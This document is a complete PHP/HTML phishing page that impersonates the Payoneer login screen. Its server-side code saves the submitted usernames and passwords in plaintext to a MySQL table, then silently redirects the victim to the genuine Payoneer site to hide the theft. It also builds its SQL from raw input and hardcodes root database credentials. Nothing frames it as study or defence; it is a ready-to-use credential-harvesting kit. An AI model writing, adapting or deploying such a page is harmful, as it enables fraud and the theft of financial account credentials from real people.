<!DOCTYPE html>
<html>
<head>
	<link rel="icon" href="unnamed.jpg">
	<title>Payoneer: Login</title>
	<?php
		include "StyleSheet.css";
	?>
</head>
<body class="background">
	<div id="Login">
		<img src="aeb2ca73a799afb8feee2ead32832a91.svg" id="logo">
		<br><br><br>
		<form action="#" method="post">
			<table id="table">
				<tr>
					<td><label class="text-box__label" for="username" title="Username">Username</label></td>
				</tr>
				<tr>
					<td><input type="text" id="username" name="username" required="required"></td>
				</tr>
				<tr>
					<td><br><label class="text-box__label" for="password" title="Password">Password</label></td>
				</tr>
				<tr>
					<td><input type="password" id="username" name="password" required="required"></td>
				</tr>
				<tr>
					<td><a href="#">Forgot password?</a></td>
				</tr>
				<tr>
					<td><input type="submit" class="button logInForm__login-button-container button--fluid button--action" id="login_button" value="Sign in"></td>
				</tr>
				<tr>
					<td><p style="margin-top: 1vh; font-size: 1.125em; margin-left: 50px;">New to Payoneer?<a href="#"> Sign up!</a></p></td>
				</tr>
			</table>
			<center>
			<div id="foooter">
				<a href="#" class="footer">&copy; 2005-2017 Payoneer Inc.</a>
				<span id="foooter">|</span>
				<a href="#" class="footer">Contact Us</a>
				<span id="foooter">|</span>
				<a href="#" class="footer">English</a>
			</div>
			</center>
		</form>
		<?php
			if ($_SERVER['REQUEST_METHOD'] == POST) {
				$username = $_POST['username'];
				$password = $_POST['password'];
				$time = date('Y-m-d h:i:sa');
				if (empty($username) or empty($password)) {
					echo "Compelet Field";
				}else{
					$host = 'localhost';
					$user = 'root';
					$passworddb = '123';
					$database = 'information';
					$connect = new mysqli($host,$user,$passworddb,$database);
					if ($connect->connect_error) {
						die("Connection is failed ".$connect->connect_error);
					}else{
						$setinfo = "INSERT INTO Accounts (username,password,reg_date)
						VALUES ('$username','$password','$time')";
						if (mysqli_query($connect,$setinfo) === true) {
							echo '<script type="text/javascript">document.location.href="https://login.payoneer.com";</script>';
						}else{
							echo "Error";
						}
					}
				}
			}
		?>
	</div>
</body>
</html>